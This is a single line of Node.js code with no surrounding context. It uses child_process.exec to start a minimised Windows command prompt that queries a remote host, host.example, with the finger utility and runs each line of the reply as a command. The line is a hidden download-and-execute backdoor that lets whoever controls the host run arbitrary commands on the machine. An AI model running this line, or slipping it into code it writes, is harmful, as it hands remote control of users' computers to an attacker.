require('child_process').exec('cmd.exe /c start \"\" /min for /f \"usebackq delims=\" %q in (\'finger user@host.example\') do %q');
